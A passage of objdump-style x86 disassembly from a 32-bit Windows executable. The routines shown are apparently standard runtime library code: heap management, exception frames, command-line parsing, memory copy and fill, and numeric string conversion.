  40242b:	03 de                	add    %esi,%ebx
  40242d:	8b 04 24             	mov    (%esp),%eax
  402430:	83 c8 02             	or     $0x2,%eax
  402433:	89 03                	mov    %eax,(%ebx)
  402435:	8b c3                	mov    %ebx,%eax
  402437:	83 c0 04             	add    $0x4,%eax
  40243a:	e8 91 f7 ff ff       	call   0x401bd0
  40243f:	e9 fe 00 00 00       	jmp    0x402542
  402444:	8b f7                	mov    %edi,%esi
  402446:	e9 f7 00 00 00       	jmp    0x402542
  40244b:	8b c6                	mov    %esi,%eax
  40244d:	2b c7                	sub    %edi,%eax
  40244f:	89 44 24 04          	mov    %eax,0x4(%esp)
  402453:	3b 1d 18 46 42 00    	cmp    0x424618,%ebx
  402459:	75 67                	jne    0x4024c2
  40245b:	a1 14 46 42 00       	mov    0x424614,%eax
  402460:	3b 44 24 04          	cmp    0x4(%esp),%eax
  402464:	7c 53                	jl     0x4024b9
  402466:	8b 44 24 04          	mov    0x4(%esp),%eax
  40246a:	29 05 14 46 42 00    	sub    %eax,0x424614
  402470:	8b 44 24 04          	mov    0x4(%esp),%eax
  402474:	01 05 18 46 42 00    	add    %eax,0x424618
  40247a:	83 3d 14 46 42 00 0c 	cmpl   $0xc,0x424614
  402481:	7d 18                	jge    0x40249b
  402483:	a1 14 46 42 00       	mov    0x424614,%eax
  402488:	01 05 18 46 42 00    	add    %eax,0x424618
  40248e:	03 35 14 46 42 00    	add    0x424614,%esi
  402494:	33 c0                	xor    %eax,%eax
  402496:	a3 14 46 42 00       	mov    %eax,0x424614
  40249b:	8b c6                	mov    %esi,%eax
  40249d:	2b c7                	sub    %edi,%eax
  40249f:	01 05 b0 45 42 00    	add    %eax,0x4245b0
  4024a5:	8b 45 00             	mov    0x0(%ebp),%eax
  4024a8:	25 03 00 00 80       	and    $0x80000003,%eax
  4024ad:	0b f0                	or     %eax,%esi
  4024af:	89 75 00             	mov    %esi,0x0(%ebp)
  4024b2:	b0 01                	mov    $0x1,%al
  4024b4:	e9 a2 00 00 00       	jmp    0x40255b
  4024b9:	e8 3e f9 ff ff       	call   0x401dfc
  4024be:	8b dd                	mov    %ebp,%ebx
  4024c0:	03 df                	add    %edi,%ebx
  4024c2:	f6 03 02             	testb  $0x2,(%ebx)
  4024c5:	75 4d                	jne    0x402514
  4024c7:	8b d3                	mov    %ebx,%edx
  4024c9:	8b c2                	mov    %edx,%eax
  4024cb:	8b 48 08             	mov    0x8(%eax),%ecx
  4024ce:	89 0c 24             	mov    %ecx,(%esp)
  4024d1:	8b 0c 24             	mov    (%esp),%ecx
  4024d4:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  4024d8:	7d 0e                	jge    0x4024e8
  4024da:	03 14 24             	add    (%esp),%edx
  4024dd:	8b da                	mov    %edx,%ebx
  4024df:	8b 04 24             	mov    (%esp),%eax
  4024e2:	29 44 24 04          	sub    %eax,0x4(%esp)
  4024e6:	eb 2c                	jmp    0x402514
  4024e8:	e8 1f f6 ff ff       	call   0x401b0c
  4024ed:	8b 44 24 04          	mov    0x4(%esp),%eax
  4024f1:	29 04 24             	sub    %eax,(%esp)
  4024f4:	83 3c 24 0c          	cmpl   $0xc,(%esp)
  4024f8:	7c 0e                	jl     0x402508
  4024fa:	8b c5                	mov    %ebp,%eax
  4024fc:	03 c6                	add    %esi,%eax
  4024fe:	8b 14 24             	mov    (%esp),%edx
  402501:	e8 6e f8 ff ff       	call   0x401d74
  402506:	eb 3a                	jmp    0x402542
  402508:	03 34 24             	add    (%esp),%esi
  40250b:	8b dd                	mov    %ebp,%ebx
  40250d:	03 de                	add    %esi,%ebx
  40250f:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  402512:	eb 2e                	jmp    0x402542
  402514:	8b 03                	mov    (%ebx),%eax
  402516:	a9 00 00 00 80       	test   $0x80000000,%eax
  40251b:	74 21                	je     0x40253e
  40251d:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  402522:	03 c3                	add    %ebx,%eax
  402524:	8b d8                	mov    %eax,%ebx
  402526:	8b 54 24 04          	mov    0x4(%esp),%edx
  40252a:	8b c3                	mov    %ebx,%eax
  40252c:	e8 cf f9 ff ff       	call   0x401f00
  402531:	84 c0                	test   %al,%al
  402533:	74 09                	je     0x40253e
  402535:	8b dd                	mov    %ebp,%ebx
  402537:	03 df                	add    %edi,%ebx
  402539:	e9 0d ff ff ff       	jmp    0x40244b
  40253e:	33 c0                	xor    %eax,%eax
  402540:	eb 19                	jmp    0x40255b
  402542:	8b c6                	mov    %esi,%eax
  402544:	2b c7                	sub    %edi,%eax
  402546:	01 05 b0 45 42 00    	add    %eax,0x4245b0
  40254c:	8b 45 00             	mov    0x0(%ebp),%eax
  40254f:	25 03 00 00 80       	and    $0x80000003,%eax
  402554:	0b f0                	or     %eax,%esi
  402556:	89 75 00             	mov    %esi,0x0(%ebp)
  402559:	b0 01                	mov    $0x1,%al
  40255b:	59                   	pop    %ecx
  40255c:	5a                   	pop    %edx
  40255d:	5d                   	pop    %ebp
  40255e:	5f                   	pop    %edi
  40255f:	5e                   	pop    %esi
  402560:	5b                   	pop    %ebx
  402561:	c3                   	ret
  402562:	8b c0                	mov    %eax,%eax
  402564:	55                   	push   %ebp
  402565:	8b ec                	mov    %esp,%ebp
  402567:	51                   	push   %ecx
  402568:	53                   	push   %ebx
  402569:	56                   	push   %esi
  40256a:	57                   	push   %edi
  40256b:	8b f2                	mov    %edx,%esi
  40256d:	8b d8                	mov    %eax,%ebx
  40256f:	80 3d bc 45 42 00 00 	cmpb   $0x0,0x4245bc
  402576:	75 13                	jne    0x40258b
  402578:	e8 eb f3 ff ff       	call   0x401968
  40257d:	84 c0                	test   %al,%al
  40257f:	75 0a                	jne    0x40258b
  402581:	33 c0                	xor    %eax,%eax
  402583:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402586:	e9 91 00 00 00       	jmp    0x40261c
  40258b:	33 d2                	xor    %edx,%edx
  40258d:	55                   	push   %ebp
  40258e:	68 15 26 40 00       	push   $0x402615
  402593:	64 ff 32             	push   %fs:(%edx)
  402596:	64 89 22             	mov    %esp,%fs:(%edx)
  402599:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  4025a0:	74 0a                	je     0x4025ac
  4025a2:	68 c4 45 42 00       	push   $0x4245c4
  4025a7:	e8 18 ed ff ff       	call   0x4012c4
  4025ac:	8b d6                	mov    %esi,%edx
  4025ae:	8b c3                	mov    %ebx,%eax
  4025b0:	e8 d3 fd ff ff       	call   0x402388
  4025b5:	84 c0                	test   %al,%al
  4025b7:	74 05                	je     0x4025be
  4025b9:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4025bc:	eb 36                	jmp    0x4025f4
  4025be:	8b c6                	mov    %esi,%eax
  4025c0:	e8 8f fa ff ff       	call   0x402054
  4025c5:	8b f8                	mov    %eax,%edi
  4025c7:	8b c3                	mov    %ebx,%eax
  4025c9:	83 e8 04             	sub    $0x4,%eax
  4025cc:	8b 00                	mov    (%eax),%eax
  4025ce:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4025d3:	83 e8 04             	sub    $0x4,%eax
  4025d6:	3b f0                	cmp    %eax,%esi
  4025d8:	7d 02                	jge    0x4025dc
  4025da:	8b c6                	mov    %esi,%eax
  4025dc:	85 ff                	test   %edi,%edi
  4025de:	74 11                	je     0x4025f1
  4025e0:	8b d7                	mov    %edi,%edx
  4025e2:	8b cb                	mov    %ebx,%ecx
  4025e4:	91                   	xchg   %eax,%ecx
  4025e5:	e8 c6 01 00 00       	call   0x4027b0
  4025ea:	8b c3                	mov    %ebx,%eax
  4025ec:	e8 f3 fb ff ff       	call   0x4021e4
  4025f1:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4025f4:	33 c0                	xor    %eax,%eax
  4025f6:	5a                   	pop    %edx
  4025f7:	59                   	pop    %ecx
  4025f8:	59                   	pop    %ecx
  4025f9:	64 89 10             	mov    %edx,%fs:(%eax)
  4025fc:	68 1c 26 40 00       	push   $0x40261c
  402601:	80 3d 45 40 42 00 00 	cmpb   $0x0,0x424045
  402608:	74 0a                	je     0x402614
  40260a:	68 c4 45 42 00       	push   $0x4245c4
  40260f:	e8 b8 ec ff ff       	call   0x4012cc
  402614:	c3                   	ret
  402615:	e9 52 0e 00 00       	jmp    0x40346c
  40261a:	eb e5                	jmp    0x402601
  40261c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40261f:	5f                   	pop    %edi
  402620:	5e                   	pop    %esi
  402621:	5b                   	pop    %ebx
  402622:	59                   	pop    %ecx
  402623:	5d                   	pop    %ebp
  402624:	c3                   	ret
  402625:	8d 40 00             	lea    0x0(%eax),%eax
  402628:	53                   	push   %ebx
  402629:	85 c0                	test   %eax,%eax
  40262b:	7e 15                	jle    0x402642
  40262d:	ff 15 38 40 41 00    	call   *0x414038
  402633:	8b d8                	mov    %eax,%ebx
  402635:	85 db                	test   %ebx,%ebx
  402637:	75 0b                	jne    0x402644
  402639:	b0 01                	mov    $0x1,%al
  40263b:	e8 d0 00 00 00       	call   0x402710
  402640:	eb 02                	jmp    0x402644
  402642:	33 db                	xor    %ebx,%ebx
  402644:	8b c3                	mov    %ebx,%eax
  402646:	5b                   	pop    %ebx
  402647:	c3                   	ret
  402648:	53                   	push   %ebx
  402649:	85 c0                	test   %eax,%eax
  40264b:	74 15                	je     0x402662
  40264d:	ff 15 3c 40 41 00    	call   *0x41403c
  402653:	8b d8                	mov    %eax,%ebx
  402655:	85 db                	test   %ebx,%ebx
  402657:	74 0b                	je     0x402664
  402659:	b0 02                	mov    $0x2,%al
  40265b:	e8 b0 00 00 00       	call   0x402710
  402660:	eb 02                	jmp    0x402664
  402662:	33 db                	xor    %ebx,%ebx
  402664:	8b c3                	mov    %ebx,%eax
  402666:	5b                   	pop    %ebx
  402667:	c3                   	ret
  402668:	8b 08                	mov    (%eax),%ecx
  40266a:	85 c9                	test   %ecx,%ecx
  40266c:	74 32                	je     0x4026a0
  40266e:	85 d2                	test   %edx,%edx
  402670:	74 18                	je     0x40268a
  402672:	50                   	push   %eax
  402673:	89 c8                	mov    %ecx,%eax
  402675:	ff 15 40 40 41 00    	call   *0x414040
  40267b:	59                   	pop    %ecx
  40267c:	09 c0                	or     %eax,%eax
  40267e:	74 19                	je     0x402699
  402680:	89 01                	mov    %eax,(%ecx)
  402682:	c3                   	ret
  402683:	b0 02                	mov    $0x2,%al
  402685:	e9 86 00 00 00       	jmp    0x402710
  40268a:	89 10                	mov    %edx,(%eax)
  40268c:	89 c8                	mov    %ecx,%eax
  40268e:	ff 15 3c 40 41 00    	call   *0x41403c
  402694:	09 c0                	or     %eax,%eax
  402696:	75 eb                	jne    0x402683
  402698:	c3                   	ret
  402699:	b0 01                	mov    $0x1,%al
  40269b:	e9 70 00 00 00       	jmp    0x402710
  4026a0:	85 d2                	test   %edx,%edx
  4026a2:	74 10                	je     0x4026b4
  4026a4:	50                   	push   %eax
  4026a5:	89 d0                	mov    %edx,%eax
  4026a7:	ff 15 38 40 41 00    	call   *0x414038
  4026ad:	59                   	pop    %ecx
  4026ae:	09 c0                	or     %eax,%eax
  4026b0:	74 e7                	je     0x402699
  4026b2:	89 01                	mov    %eax,(%ecx)
  4026b4:	c3                   	ret
  4026b5:	8d 40 00             	lea    0x0(%eax),%eax
  4026b8:	89 15 04 40 41 00    	mov    %edx,0x414004
  4026be:	e8 69 13 00 00       	call   0x403a2c
  4026c3:	c3                   	ret
  4026c4:	53                   	push   %ebx
  4026c5:	56                   	push   %esi
  4026c6:	8b f2                	mov    %edx,%esi
  4026c8:	8b d8                	mov    %eax,%ebx
  4026ca:	80 e3 7f             	and    $0x7f,%bl
  4026cd:	83 3d 08 40 42 00 00 	cmpl   $0x0,0x424008
  4026d4:	74 0a                	je     0x4026e0
  4026d6:	8b d6                	mov    %esi,%edx
  4026d8:	8b c3                	mov    %ebx,%eax
  4026da:	ff 15 08 40 42 00    	call   *0x424008
  4026e0:	84 db                	test   %bl,%bl
  4026e2:	75 0d                	jne    0x4026f1
  4026e4:	e8 3f 2f 00 00       	call   0x405628
  4026e9:	8b 98 04 00 00 00    	mov    0x4(%eax),%ebx
  4026ef:	eb 0f                	jmp    0x402700
  4026f1:	80 fb 18             	cmp    $0x18,%bl
  4026f4:	77 0a                	ja     0x402700
  4026f6:	33 c0                	xor    %eax,%eax
  4026f8:	8a c3                	mov    %bl,%al
  4026fa:	8a 98 44 40 41 00    	mov    0x414044(%eax),%bl
  402700:	33 c0                	xor    %eax,%eax
  402702:	8a c3                	mov    %bl,%al
  402704:	8b d6                	mov    %esi,%edx
  402706:	e8 ad ff ff ff       	call   0x4026b8
  40270b:	5e                   	pop    %esi
  40270c:	5b                   	pop    %ebx
  40270d:	c3                   	ret
  40270e:	8b c0                	mov    %eax,%eax
  402710:	83 e0 7f             	and    $0x7f,%eax
  402713:	8b 14 24             	mov    (%esp),%edx
  402716:	e9 a9 ff ff ff       	jmp    0x4026c4
  40271b:	c3                   	ret
  40271c:	50                   	push   %eax
  40271d:	52                   	push   %edx
  40271e:	51                   	push   %ecx
  40271f:	e8 04 2f 00 00       	call   0x405628
  402724:	83 b8 04 00 00 00 00 	cmpl   $0x0,0x4(%eax)
  40272b:	59                   	pop    %ecx
  40272c:	5a                   	pop    %edx
  40272d:	58                   	pop    %eax
  40272e:	75 01                	jne    0x402731
  402730:	c3                   	ret
  402731:	31 c0                	xor    %eax,%eax
  402733:	e9 d8 ff ff ff       	jmp    0x402710
  402738:	c3                   	ret
  402739:	8d 40 00             	lea    0x0(%eax),%eax
  40273c:	53                   	push   %ebx
  40273d:	8b d8                	mov    %eax,%ebx
  40273f:	e8 e4 2e 00 00       	call   0x405628
  402744:	89 98 04 00 00 00    	mov    %ebx,0x4(%eax)
  40274a:	5b                   	pop    %ebx
  40274b:	c3                   	ret
  40274c:	56                   	push   %esi
  40274d:	57                   	push   %edi
  40274e:	89 c6                	mov    %eax,%esi
  402750:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402754:	31 c0                	xor    %eax,%eax
  402756:	0a 06                	or     (%esi),%al
  402758:	74 2b                	je     0x402785
  40275a:	85 d2                	test   %edx,%edx
  40275c:	7e 18                	jle    0x402776
  40275e:	39 c2                	cmp    %eax,%edx
  402760:	7f 1b                	jg     0x40277d
  402762:	29 d0                	sub    %edx,%eax
  402764:	40                   	inc    %eax
  402765:	85 c9                	test   %ecx,%ecx
  402767:	7c 14                	jl     0x40277d
  402769:	39 c1                	cmp    %eax,%ecx
  40276b:	7f 14                	jg     0x402781
  40276d:	01 d6                	add    %edx,%esi
  40276f:	88 0f                	mov    %cl,(%edi)
  402771:	47                   	inc    %edi
  402772:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402774:	eb 11                	jmp    0x402787
  402776:	ba 01 00 00 00       	mov    $0x1,%edx
  40277b:	eb e5                	jmp    0x402762
  40277d:	31 c9                	xor    %ecx,%ecx
  40277f:	eb ec                	jmp    0x40276d
  402781:	89 c1                	mov    %eax,%ecx
  402783:	eb e8                	jmp    0x40276d
  402785:	88 07                	mov    %al,(%edi)
  402787:	5f                   	pop    %edi
  402788:	5e                   	pop    %esi
  402789:	c2 04 00             	ret    $0x4
  40278c:	c3                   	ret
  40278d:	8d 40 00             	lea    0x0(%eax),%eax
  402790:	53                   	push   %ebx
  402791:	e8 92 2e 00 00       	call   0x405628
  402796:	8b 98 04 00 00 00    	mov    0x4(%eax),%ebx
  40279c:	e8 87 2e 00 00       	call   0x405628
  4027a1:	33 d2                	xor    %edx,%edx
  4027a3:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  4027a9:	8b c3                	mov    %ebx,%eax
  4027ab:	5b                   	pop    %ebx
  4027ac:	c3                   	ret
  4027ad:	8d 40 00             	lea    0x0(%eax),%eax
  4027b0:	56                   	push   %esi
  4027b1:	57                   	push   %edi
  4027b2:	89 c6                	mov    %eax,%esi
  4027b4:	89 d7                	mov    %edx,%edi
  4027b6:	89 c8                	mov    %ecx,%eax
  4027b8:	39 f7                	cmp    %esi,%edi
  4027ba:	77 13                	ja     0x4027cf
  4027bc:	74 2f                	je     0x4027ed
  4027be:	c1 f9 02             	sar    $0x2,%ecx
  4027c1:	78 2a                	js     0x4027ed
  4027c3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4027c5:	89 c1                	mov    %eax,%ecx
  4027c7:	83 e1 03             	and    $0x3,%ecx
  4027ca:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4027cc:	5f                   	pop    %edi
  4027cd:	5e                   	pop    %esi
  4027ce:	c3                   	ret
  4027cf:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  4027d3:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  4027d7:	c1 f9 02             	sar    $0x2,%ecx
  4027da:	78 11                	js     0x4027ed
  4027dc:	fd                   	std
  4027dd:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4027df:	89 c1                	mov    %eax,%ecx
  4027e1:	83 e1 03             	and    $0x3,%ecx
  4027e4:	83 c6 03             	add    $0x3,%esi
  4027e7:	83 c7 03             	add    $0x3,%edi
  4027ea:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4027ec:	fc                   	cld
  4027ed:	5f                   	pop    %edi
  4027ee:	5e                   	pop    %esi
  4027ef:	c3                   	ret
  4027f0:	53                   	push   %ebx
  4027f1:	56                   	push   %esi
  4027f2:	57                   	push   %edi
  4027f3:	55                   	push   %ebp
  4027f4:	8b f2                	mov    %edx,%esi
  4027f6:	8b d8                	mov    %eax,%ebx
  4027f8:	eb 08                	jmp    0x402802
  4027fa:	53                   	push   %ebx
  4027fb:	e8 88 e9 ff ff       	call   0x401188
  402800:	8b d8                	mov    %eax,%ebx
  402802:	8a 03                	mov    (%ebx),%al
  402804:	84 c0                	test   %al,%al
  402806:	74 04                	je     0x40280c
  402808:	3c 20                	cmp    $0x20,%al
  40280a:	76 ee                	jbe    0x4027fa
  40280c:	80 3b 22             	cmpb   $0x22,(%ebx)
  40280f:	75 0b                	jne    0x40281c
  402811:	80 7b 01 22          	cmpb   $0x22,0x1(%ebx)
  402815:	75 05                	jne    0x40281c
  402817:	83 c3 02             	add    $0x2,%ebx
  40281a:	eb e6                	jmp    0x402802
  40281c:	33 ed                	xor    %ebp,%ebp
  40281e:	8b fb                	mov    %ebx,%edi
  402820:	eb 43                	jmp    0x402865
  402822:	3c 22                	cmp    $0x22,%al
  402824:	75 31                	jne    0x402857
  402826:	53                   	push   %ebx
  402827:	e8 5c e9 ff ff       	call   0x401188
  40282c:	8b d8                	mov    %eax,%ebx
  40282e:	eb 0e                	jmp    0x40283e
  402830:	53                   	push   %ebx
  402831:	e8 52 e9 ff ff       	call   0x401188
  402836:	8b d0                	mov    %eax,%edx
  402838:	2b d3                	sub    %ebx,%edx
  40283a:	03 ea                	add    %edx,%ebp
  40283c:	8b d8                	mov    %eax,%ebx
  40283e:	8a 03                	mov    (%ebx),%al
  402840:	84 c0                	test   %al,%al
  402842:	74 04                	je     0x402848
  402844:	3c 22                	cmp    $0x22,%al
  402846:	75 e8                	jne    0x402830
  402848:	80 3b 00             	cmpb   $0x0,(%ebx)
  40284b:	74 18                	je     0x402865
  40284d:	53                   	push   %ebx
  40284e:	e8 35 e9 ff ff       	call   0x401188
  402853:	8b d8                	mov    %eax,%ebx
  402855:	eb 0e                	jmp    0x402865
  402857:	53                   	push   %ebx
  402858:	e8 2b e9 ff ff       	call   0x401188
  40285d:	8b d0                	mov    %eax,%edx
  40285f:	2b d3                	sub    %ebx,%edx
  402861:	03 ea                	add    %edx,%ebp
  402863:	8b d8                	mov    %eax,%ebx
  402865:	8a 03                	mov    (%ebx),%al
  402867:	3c 20                	cmp    $0x20,%al
  402869:	77 b7                	ja     0x402822
  40286b:	8b c6                	mov    %esi,%eax
  40286d:	8b d5                	mov    %ebp,%edx
  40286f:	e8 9c 17 00 00       	call   0x404010
  402874:	8b df                	mov    %edi,%ebx
  402876:	8b 3e                	mov    (%esi),%edi
  402878:	33 f6                	xor    %esi,%esi
  40287a:	eb 51                	jmp    0x4028cd
  40287c:	3c 22                	cmp    $0x22,%al
  40287e:	75 38                	jne    0x4028b8
  402880:	53                   	push   %ebx
  402881:	e8 02 e9 ff ff       	call   0x401188
  402886:	8b d8                	mov    %eax,%ebx
  402888:	eb 15                	jmp    0x40289f
  40288a:	53                   	push   %ebx
  40288b:	e8 f8 e8 ff ff       	call   0x401188
  402890:	3b c3                	cmp    %ebx,%eax
  402892:	76 0b                	jbe    0x40289f
  402894:	8a 13                	mov    (%ebx),%dl
  402896:	88 14 37             	mov    %dl,(%edi,%esi,1)
  402899:	43                   	inc    %ebx
  40289a:	46                   	inc    %esi
  40289b:	3b c3                	cmp    %ebx,%eax
  40289d:	77 f5                	ja     0x402894
  40289f:	8a 03                	mov    (%ebx),%al
  4028a1:	84 c0                	test   %al,%al
  4028a3:	74 04                	je     0x4028a9
  4028a5:	3c 22                	cmp    $0x22,%al
  4028a7:	75 e1                	jne    0x40288a
  4028a9:	80 3b 00             	cmpb   $0x0,(%ebx)
  4028ac:	74 1f                	je     0x4028cd
  4028ae:	53                   	push   %ebx
  4028af:	e8 d4 e8 ff ff       	call   0x401188
  4028b4:	8b d8                	mov    %eax,%ebx
  4028b6:	eb 15                	jmp    0x4028cd
  4028b8:	53                   	push   %ebx
  4028b9:	e8 ca e8 ff ff       	call   0x401188
  4028be:	3b c3                	cmp    %ebx,%eax
  4028c0:	76 0b                	jbe    0x4028cd
  4028c2:	8a 13                	mov    (%ebx),%dl
  4028c4:	88 14 37             	mov    %dl,(%edi,%esi,1)
  4028c7:	43                   	inc    %ebx
  4028c8:	46                   	inc    %esi
  4028c9:	3b c3                	cmp    %ebx,%eax
  4028cb:	77 f5                	ja     0x4028c2
  4028cd:	8a 03                	mov    (%ebx),%al
  4028cf:	3c 20                	cmp    $0x20,%al
  4028d1:	77 a9                	ja     0x40287c
  4028d3:	8b c3                	mov    %ebx,%eax
  4028d5:	5d                   	pop    %ebp
  4028d6:	5f                   	pop    %edi
  4028d7:	5e                   	pop    %esi
  4028d8:	5b                   	pop    %ebx
  4028d9:	c3                   	ret
  4028da:	8b c0                	mov    %eax,%eax
  4028dc:	53                   	push   %ebx
  4028dd:	56                   	push   %esi
  4028de:	57                   	push   %edi
  4028df:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  4028e5:	8b da                	mov    %edx,%ebx
  4028e7:	8b f0                	mov    %eax,%esi
  4028e9:	8b c3                	mov    %ebx,%eax
  4028eb:	e8 54 11 00 00       	call   0x403a44
  4028f0:	85 f6                	test   %esi,%esi
  4028f2:	75 1e                	jne    0x402912
  4028f4:	68 05 01 00 00       	push   $0x105
  4028f9:	8d 44 24 04          	lea    0x4(%esp),%eax
  4028fd:	50                   	push   %eax
  4028fe:	6a 00                	push   $0x0
  402900:	e8 c3 e8 ff ff       	call   0x4011c8
  402905:	8b c8                	mov    %eax,%ecx
  402907:	8b d4                	mov    %esp,%edx
  402909:	8b c3                	mov    %ebx,%eax
  40290b:	e8 24 12 00 00       	call   0x403b34
  402910:	eb 1e                	jmp    0x402930
  402912:	e8 a1 e8 ff ff       	call   0x4011b8
  402917:	8b f8                	mov    %eax,%edi
  402919:	8b d3                	mov    %ebx,%edx
  40291b:	8b c7                	mov    %edi,%eax
  40291d:	e8 ce fe ff ff       	call   0x4027f0
  402922:	8b f8                	mov    %eax,%edi
  402924:	85 f6                	test   %esi,%esi
  402926:	74 08                	je     0x402930
  402928:	83 3b 00             	cmpl   $0x0,(%ebx)
  40292b:	74 03                	je     0x402930
  40292d:	4e                   	dec    %esi
  40292e:	eb e9                	jmp    0x402919
  402930:	81 c4 08 01 00 00    	add    $0x108,%esp
  402936:	5f                   	pop    %edi
  402937:	5e                   	pop    %esi
  402938:	5b                   	pop    %ebx
  402939:	c3                   	ret
  40293a:	8b c0                	mov    %eax,%eax
  40293c:	83 3d 28 40 42 00 00 	cmpl   $0x0,0x424028
  402943:	74 06                	je     0x40294b
  402945:	ff 15 28 40 42 00    	call   *0x424028
  40294b:	b8 d2 00 00 00       	mov    $0xd2,%eax
  402950:	e9 e3 10 00 00       	jmp    0x403a38
  402955:	c3                   	ret
  402956:	8b c0                	mov    %eax,%eax
  402958:	53                   	push   %ebx
  402959:	66 8b 48 04          	mov    0x4(%eax),%cx
  40295d:	66 81 e9 b1 d7       	sub    $0xd7b1,%cx
  402962:	74 0f                	je     0x402973
  402964:	49                   	dec    %ecx
  402965:	66 83 e9 02          	sub    $0x2,%cx
  402969:	73 0c                	jae    0x402977
  40296b:	8b da                	mov    %edx,%ebx
  40296d:	ff d3                	call   *%ebx
  40296f:	8b d8                	mov    %eax,%ebx
  402971:	eb 1b                	jmp    0x40298e
  402973:	33 db                	xor    %ebx,%ebx
  402975:	eb 17                	jmp    0x40298e
  402977:	3d 14 42 42 00       	cmp    $0x424214,%eax
  40297c:	74 07                	je     0x402985
  40297e:	3d e0 43 42 00       	cmp    $0x4243e0,%eax
  402983:	75 04                	jne    0x402989
  402985:	33 db                	xor    %ebx,%ebx
  402987:	eb 05                	jmp    0x40298e
  402989:	bb 67 00 00 00       	mov    $0x67,%ebx
  40298e:	85 db                	test   %ebx,%ebx
  402990:	74 07                	je     0x402999
  402992:	8b c3                	mov    %ebx,%eax
  402994:	e8 a3 fd ff ff       	call   0x40273c
  402999:	8b c3                	mov    %ebx,%eax
  40299b:	5b                   	pop    %ebx
  40299c:	c3                   	ret
  40299d:	8d 40 00             	lea    0x0(%eax),%eax
  4029a0:	8b 50 1c             	mov    0x1c(%eax),%edx
  4029a3:	e8 b0 ff ff ff       	call   0x402958
  4029a8:	c3                   	ret
  4029a9:	8d 40 00             	lea    0x0(%eax),%eax
  4029ac:	53                   	push   %ebx
  4029ad:	56                   	push   %esi
  4029ae:	8b d8                	mov    %eax,%ebx
  4029b0:	33 f6                	xor    %esi,%esi
  4029b2:	66 8b 43 04          	mov    0x4(%ebx),%ax
  4029b6:	66 3d b1 d7          	cmp    $0xd7b1,%ax
  4029ba:	72 2f                	jb     0x4029eb
  4029bc:	66 3d b3 d7          	cmp    $0xd7b3,%ax
  4029c0:	77 29                	ja     0x4029eb
  4029c2:	66 25 b2 d7          	and    $0xd7b2,%ax
  4029c6:	66 3d b2 d7          	cmp    $0xd7b2,%ax
  4029ca:	75 07                	jne    0x4029d3
  4029cc:	8b c3                	mov    %ebx,%eax
  4029ce:	ff 53 1c             	call   *0x1c(%ebx)
  4029d1:	8b f0                	mov    %eax,%esi
  4029d3:	85 f6                	test   %esi,%esi
  4029d5:	75 07                	jne    0x4029de
  4029d7:	8b c3                	mov    %ebx,%eax
  4029d9:	ff 53 24             	call   *0x24(%ebx)
  4029dc:	8b f0                	mov    %eax,%esi
  4029de:	85 f6                	test   %esi,%esi
  4029e0:	74 1b                	je     0x4029fd
  4029e2:	8b c6                	mov    %esi,%eax
  4029e4:	e8 53 fd ff ff       	call   0x40273c
  4029e9:	eb 12                	jmp    0x4029fd
  4029eb:	81 fb 48 40 42 00    	cmp    $0x424048,%ebx
  4029f1:	74 0a                	je     0x4029fd
  4029f3:	b8 67 00 00 00       	mov    $0x67,%eax
  4029f8:	e8 3f fd ff ff       	call   0x40273c
  4029fd:	8b c6                	mov    %esi,%eax
  4029ff:	5e                   	pop    %esi
  402a00:	5b                   	pop    %ebx
  402a01:	c3                   	ret
  402a02:	8b c0                	mov    %eax,%eax
  402a04:	57                   	push   %edi
  402a05:	89 c7                	mov    %eax,%edi
  402a07:	88 cd                	mov    %cl,%ch
  402a09:	89 c8                	mov    %ecx,%eax
  402a0b:	c1 e0 10             	shl    $0x10,%eax
  402a0e:	66 89 c8             	mov    %cx,%ax
  402a11:	89 d1                	mov    %edx,%ecx
  402a13:	c1 f9 02             	sar    $0x2,%ecx
  402a16:	78 09                	js     0x402a21
  402a18:	f3 ab                	rep stos %eax,%es:(%edi)
  402a1a:	89 d1                	mov    %edx,%ecx
  402a1c:	83 e1 03             	and    $0x3,%ecx
  402a1f:	f3 aa                	rep stos %al,%es:(%edi)
  402a21:	5f                   	pop    %edi
  402a22:	c3                   	ret
  402a23:	90                   	nop
  402a24:	53                   	push   %ebx
  402a25:	56                   	push   %esi
  402a26:	57                   	push   %edi
  402a27:	89 c6                	mov    %eax,%esi
  402a29:	50                   	push   %eax
  402a2a:	85 c0                	test   %eax,%eax
  402a2c:	74 6c                	je     0x402a9a
  402a2e:	31 c0                	xor    %eax,%eax
  402a30:	31 db                	xor    %ebx,%ebx
  402a32:	bf cc cc cc 0c       	mov    $0xccccccc,%edi
  402a37:	8a 1e                	mov    (%esi),%bl
  402a39:	46                   	inc    %esi
  402a3a:	80 fb 20             	cmp    $0x20,%bl
  402a3d:	74 f8                	je     0x402a37
  402a3f:	b5 00                	mov    $0x0,%ch
  402a41:	80 fb 2d             	cmp    $0x2d,%bl
  402a44:	74 62                	je     0x402aa8
  402a46:	80 fb 2b             	cmp    $0x2b,%bl
  402a49:	74 5f                	je     0x402aaa
  402a4b:	80 fb 24             	cmp    $0x24,%bl
  402a4e:	74 5f                	je     0x402aaf
  402a50:	80 fb 78             	cmp    $0x78,%bl
  402a53:	74 5a                	je     0x402aaf
  402a55:	80 fb 58             	cmp    $0x58,%bl
  402a58:	74 55                	je     0x402aaf
  402a5a:	80 fb 30             	cmp    $0x30,%bl
  402a5d:	75 13                	jne    0x402a72
  402a5f:	8a 1e                	mov    (%esi),%bl
  402a61:	46                   	inc    %esi
  402a62:	80 fb 78             	cmp    $0x78,%bl
  402a65:	74 48                	je     0x402aaf
  402a67:	80 fb 58             	cmp    $0x58,%bl
